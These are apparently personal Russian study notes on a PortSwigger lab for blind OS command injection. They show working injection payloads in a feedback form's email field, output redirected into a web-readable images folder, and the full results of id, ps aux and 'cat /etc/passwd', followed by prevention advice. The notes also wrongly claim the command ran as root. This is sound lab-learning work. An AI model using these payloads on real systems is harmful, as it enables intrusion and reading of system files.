
осн теория [[0_OSi_иньекции_теория_уязвимостей]]

доп теория к лабе


### Эксплуатация слепой инъекции команд в ОС путём перенаправления вывода

# **Суть:** Команда выполняется, но ответа нет. Надо **вытащить вывод** наружу.

**Как работает:**

1. **Выполни команду** (но так как мне вывода нет по HTTP тогда:):
    
2. **Запиши результат в файл**
    
3. **Скачай файл через браузер**

----

пример 
```bash
& whoami > /var/www/static/whoami.txt &
или
& ifconfig > /var/www/static/ip.txt &
или
& id > /var/www/html/user.txt &
что угодно..

---

- `&` — запустить в фоне
    
- `whoami` — узнать имя пользователя
    
- `>` — взять вывод и засунуть в файл!!!!!!
    
- `/var/www/static/whoami.txt` — путь внутри веб-сервера
    
- `&` — ещё один фон, чтоб не ждать


далее в браузере открыть

https://vulnerable-website.com/whoami.txt   и получить этот файл с результ команды!

Условия:

✅ Веб-сервер должен иметь право писать в эту папку  
✅ Папка должна быть доступна извне (статический контент)  
✅ Нужно знать или угадать путь

```

-----

лаба
https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
путь уже дан в лабе     /var/www/images/

задание - записать в файл результат    whoami  и получить результат

---

нашел такой запрос где вожно пробовать вводить свои данные в номер файла
```http
GET /image?filename=68.jpg HTTP/2
Host: 0aea002f043c995e80f83f8900f9008e.web-security-academy.net
.....
...
.

```


недолго подбирая нашел комбинацию которая сработала и не дала ошибок в ответе
```
ошбика

GET /image?filename=68.jpg&+whoami+&
GET /image?filename=68.jpg&+ping+-c+10+127.0.0.1+&
||+ping+-c+10+127.0.0.1+||
и подобные варианты
но задержки нет
ищу другой вектор атаки
```

возвращаюсь к уязвимому запросу как в прошлой лабе 
+ (это единственнй пост запрос вообще)
```http
POST /feedback/submit HTTP/2
Host: 0aea002f043c995e80f83f8900f9008e.web-security-academy.net
.....
...
.

csrf=w3zHIGoRYckjEOdwMR3P6ZDEcBqmayPM&name=%D1%83%D0%B5%D0%BF%D1%83&email=etgr%40rg.ge&subject=%D1%83%D0%BA%D0%BF%D1%83%D0%BF&message=%D1%83%D0%BA%D0%BF%D1%83%D1%83
```

поле email подставил ` ||+ping+-c+10+127.0.0.1+|| `
и сразу попал - выполнилась задержка респонса в 10 сек!

пейлоад ошбика
```
whoami+>+/var/www/images/whoami.txt

https://0aea002f043c995e80f83f8900f9008e.web-security-academy.net/whoami.txt

не найдено..
```

пейлоад ошбика
```
whoami+>+/var/www/images/output.txt

https://0aea002f043c995e80f83f8900f9008e.web-security-academy.net/output.txt

не найдено..
```


точно, зачем я пытался пост запросом получить, когда я выше уже нашел гет запрос 
```http
GET /image?filename=68.jpg HTTP/2
Host: 0aea002f043c995e80f83f8900f9008e.web-security-academy.net
.....
..
.
```

пейлоад
```http
GET /image?filename=output.txt HTTP/2

либо
https://0aea002f043c995e80f83f8900f9008e.web-security-academy.net/image?filename=output.txt

через браузер:
```
![[СнимокAILLM213.26.50.png]]

ЛАБА  РЕШЕНА!
------

пробую достать другие данные

запрос пост ==id==
```bash
csrf=w3zHIGoRYckjEOdwMR3P6ZDEcBqmayPM&name=%D1%83%D0%B5%D0%BF%D1%83&email=||id+>+/var/www/images/output.txt||&subject=%D1%83%D0%BA%D0%BF%D1%83%D0%BF&message=%D1%83%D0%BA%D0%BF%D1%83%D1%83
```
запрос гет
```http
GET /image?filename=output.txt HTTP/2
...
.
```
ответ:
```
uid=12001(peter-fC9vVv) gid=12001(peter) groups=12001(peter)
```

---

запрос пост  ==ps==
```bash
csrf=w3zHIGoRYckjEOdwMR3P6ZDEcBqmayPM&name=%D1%83%D0%B5%D0%BF%D1%83&email=||ps+>+/var/www/images/output.txt||&subject=%D1%83%D0%BA%D0%BF%D1%83%D0%BF&message=%D1%83%D0%BA%D0%BF%D1%83%D1%83
```
запрос гет
```http
GET /image?filename=output.txt HTTP/2
...
.
```
ответ:
```
  PID TTY          TIME CMD
 1002 ?        00:00:00 sh
 1004 ?        00:00:00 ps

```

----


запрос пост    ==ps+aux==
```bash
POST /feedback/submit HTTP/2
Host: 0aea002f043c995e80f83f8900f9008e.web-security-academy.net
Cookie: session=iraEN3piD2OYbl8UGqsUDzMUSTMjGUnt
.....
..
.

csrf=w3zHIGoRYckjEOdwMR3P6ZDEcBqmayPM&name=%D1%83%D0%B5%D0%BF%D1%83&email=||ps+aux+>+/var/www/images/output.txt||&subject=%D1%83%D0%BA%D0%BF%D1%83%D0%BF&message=%D1%83%D0%BA%D0%BF%D1%83%D1%83


```
запрос гет
```http
GET /image?filename=output.txt HTTP/2
...
.
```
ответ:
```bash
  HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3049

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0    940     4 ?        Ss   08:02   0:00 /sbin/docker-init -- /academy/run.sh java -Dlog4j2.formatMsgNoLookups=true -Dnetworkaddress.cache.ttl=60 -Dnetworkaddress.cache.negative.ttl=10 -jar /academy/jars/lab-base-snapshot.jar
root         7  0.0  0.1   3980  2996 ?        S    08:02   0:00 /bin/bash /academy/run.sh java -Dlog4j2.formatMsgNoLookups=true -Dnetworkaddress.cache.ttl=60 -Dnetworkaddress.cache.negative.ttl=10 -jar /academy/jars/lab-base-snapshot.jar
root        17  0.0  0.8 1846236 16280 ?       Ssl  08:02   0:00 /ecs-execute-command-807b313f-ba9b-42ec-9790-23b4b735fc22/amazon-ssm-agent
root        38  0.0  1.4 1857912 28092 ?       Sl   08:02   0:00 /ecs-execute-command-807b313f-ba9b-42ec-9790-23b4b735fc22/ssm-agent-worker
root        52  0.0  0.0   2640   780 ?        S    08:02   0:00 inotifywait -m /academy/aws_credentials --timefmt %y-%m-%d %H:%M:%S.000 --format NOTIFY [%T] %w %e %f
dnsmasq    325  0.0  0.0   2944   152 ?        S    08:02   0:00 dnsmasq --user=dnsmasq --log-queries=extra --log-facility=- --bogus-priv --no-resolv --server=/api.openai.com/169.254.169.253 --server=/*.api.openai.com/ --address=/weliketoshop.net/192.168.0.1 --server=/burpcollaborator.net/169.254.169.253 --server=/oastify.com/169.254.169.253 --server=/cms-0aea002f043c995e80f83f8900f9008e.web-security-academy.net/169.254.169.253 --server=/0aea002f043c995e80f83f8900f9008e.web-security-academy.net/169.254.169.253 --server=/exploit-0a740047045099c080543ef201b2008c.exploit-server.net/169.254.169.253 --server=/oauth-0a8100b704d7994580e93dfb02e30027.oauth-server.net/169.254.169.253 --server=/ssmmessages.eu-west-1.amazonaws.com/169.254.169.253 --server=/1.web-security-academy.net/169.254.169.253 --server=/2.web-security-academy.net/169.254.169.253 --server=/3.web-security-academy.net/169.254.169.253 --server=/*.1.web-security-academy.net/ --server=/*.2.web-security-academy.net/ --server=/*.3.web-security-academy.net/ --server=/#/
root       328  0.0  0.2   6344  4176 ?        S    08:02   0:00 sudo -EHu academy java -Dlog4j2.formatMsgNoLookups=true -Dnetworkaddress.cache.ttl=60 -Dnetworkaddress.cache.negative.ttl=10 -jar /academy/jars/lab-base-snapshot.jar hot
academy    329  0.8  7.0 2646688 140616 ?      Sl   08:02   0:14 java -Dlog4j2.formatMsgNoLookups=true -Dnetworkaddress.cache.ttl=60 -Dnetworkaddress.cache.negative.ttl=10 -jar /academy/jars/lab-base-snapshot.jar hot
root      1016  0.0  0.2   6336  4180 ?        S    08:30   0:00 sudo -H -u peter-fC9vVv sh -c bash /home/peter-fC9vVv/mail.sh "????????" ||ps aux > /var/www/images/output.txt|| "Feedback" feedback@ginandjuice.shop "??????????" "??????????. . . . . "
peter-f+  1020  0.0  0.0   2612   596 ?        S    08:30   0:00 sh -c bash /home/peter-fC9vVv/mail.sh "????????" ||ps aux > /var/www/images/output.txt|| "Feedback" feedback@ginandjuice.shop "??????????" "??????????. . . . . "
peter-f+  1022  0.0  0.1   5896  2868 ?        R    08:30   0:00 ps aux


```

полезное что нашел :

root      1016  0.0  0.2   6336  4180 ?        S    08:30   0:00 sudo -H -u peter-fC9vVv sh -c bash /home/peter-fC9vVv/mail.sh "????????" ||ps aux > /var/www/images/output.txt|| "Feedback" feedback@ginandjuice.shop "??????????" "??????????. . . . . "
тут можно видеть что моя команда   ps aux > /var/www/images/output.txt|| выполнилась от рута
- root делает sudo под peter-xxxxx
-  peter выполняет твой код
- вся конструкция запущена root'ом
feedback@ginandjuice.shop потча/домен?

===== 9 стр-ка    **SSRF точки входа**
dnsmasq --server===/api.openai.com/169.254.169.253==
dnsmasq --server===/burpcollaborator.net/169.254.169.253==
dnsmasq --server===/weliketoshop.net/192.168.0.1==
Они **перенаправляют DNS запросы** для определенных доменов.  
`weliketoshop.net` → `192.168.0.1` (внутренний IP)  
Это может быть SSRF, DNS rebinding и т.д.

=======
++ есть /mail.sh скрипт, который можно прочесть

---
### Едем дальше 

запрос пост   ==cat+/etc/passwd==
```bash
POST /feedback/submit HTTP/2
Host: 0aea002f043c995e80f83f8900f9008e.web-security-academy.net
Cookie: session=iraEN3piD2OYbl8UGqsUDzMUSTMjGUnt
.....
..
.

csrf=w3zHIGoRYckjEOdwMR3P6ZDEcBqmayPM&name=%D1%83%D0%B5%D0%BF%D1%83&email=||cat+/etc/passwd+>+/var/www/images/passwd.txt||&subject=%D1%83%D0%BA%D0%BF%D1%83%D0%BF&message=%D1%83%D0%BA%D0%BF%D1%83%D1%83



```
запрос гет   passwd.txt
```http
GET /image?filename=passwd.txt HTTP/2
...
.
```
ответ:
```bash
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2330

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
peter-fC9vVv:x:12001:12001::/home/peter-fC9vVv:/bin/bash

```
че интересного

##### ПОЛЬЗОВАТЕЛИ С ШЕЛЛОМ (кто может залогиниться) и их uid
root:x:0:0:root:/root:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
postgres:x:107:110::/var/lib/postgresql:/bin/bash
peter-fC9vVv:x:12001:12001::/home/peter-fC9vVv:/bin/bash

postgres -БД
mysql - БД
mongodb - БД
Значит есть порты 3306, 5432, 27017.


academy папка
/home/carlos/   папка
/home/user/   папка
/home/elmer/    папка
/home/peter-fC9vVv/  папка

-------
лаба давно решена, углубляться не буду

----







## КАК НЕ ДОПУСТИТЬ OS COMMAND INJECTION ?
### кратко - **НИКОГДА** не передавать польз ввод в шелл!

---

**НЕ ИСПОЛЬЗ СИСТЕМНЫЕ КОМАНДЫ**

- Нет `system()`, `exec()`, `shell_exec()`, `popen()`, `subprocess.call()`
- Нет вызова шелла вообще. **Совсем. Вообще. На/|.*
---

**ИСПОЛЬЗОВАТЬ ВСТРОЕННЫЕ БИБЛИОТЕКИ**

- Отправить почту → **SMTP-библиотека**, не `mail` команда
- Пинг → **сокеты/ICMP**, не `ping` утилита
- DNS → **DNS-библиотека**, не `nslookup`
---

**ВАЛИДАЦИЯ ВХОДНЫХ ДАННЫХ 

- Белый список: только `a-z0-9@._-` для email
- Никаких `| & ; $ () \` `{} [] <> ! # %`
- **НЕ ПОЛАГАЙСЯ ТОЛЬКО НА ЭТО** — обойдут так как есть тысячи вариантов комбинаций, которые можно обойти
---

**ЭСКЕЙПИНГ — ТОЛЬКО ЕСЛИ БЕЗ НЕГО НИКАК ВООБЩЕ НЕЛЬЗЯ ОБОЙТИСЬ..
- `escapeshellarg()`, `escapeshellcmd()` в PHP
- `shlex.quote()` в Python
- Но лучше **НЕ ИСПОЛЬЗОВАТЬ ШЕЛЛ ВООБЩЕ**
---

**МИНИМАЛЬНЫЕ ПРИВИЛЕГИИ*
- Веб-сервер не должен быть root
- Запускать от www-data / nobody
- Упал — не root, урон меньше
---

**ПРИНЦИП НАИМЕНЬШИХ ПРИВИЛЕГИЙ ДЛЯ ФАЙЛОВОЙ СИСТЕМЫ**
- Нет прав на зпись вне нужных директорий
- Нет доступа к `/bin`, `/usr/bin` без нужды
---

**РЕГУЛЯРНОЕ ТЕСТИРОВАНИЕ**

- SAST (статический анализ кода)
- DAST (пентест/сканирование)
---

**ИСПОЛЬЗОВАТЬ ПОЛИТИКИ БЕЗОПАСНОСТИ**
- AppArmor / SELinux — ограничить что может делать веб-сервер
- chroot / контейнеры — изоляция
---





